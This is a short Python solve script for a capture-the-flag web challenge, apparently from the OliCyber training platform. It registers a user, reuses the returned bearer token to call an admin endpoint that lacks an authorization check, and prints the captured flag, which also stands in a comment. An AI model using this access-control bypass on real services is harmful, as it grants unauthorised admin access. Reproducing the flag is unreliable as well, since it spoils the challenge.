import requests, re, json

site = "https://single-page-admin.challs.olicyber.it"
reg = requests.post(f"{site}/api/register", json ={"username" : "zamuyvyvyv"}).json()
token = reg['token']
print(token)

flag = requests.post(f"{site}/api/admin", headers = {"Authorization" : f"Bearer {token}"}).json()
print(flag['message'])


#flag{s3rv3r_sh0ud_re4lly_ch3ck_4uth_t0o_..._0a77d8fc}
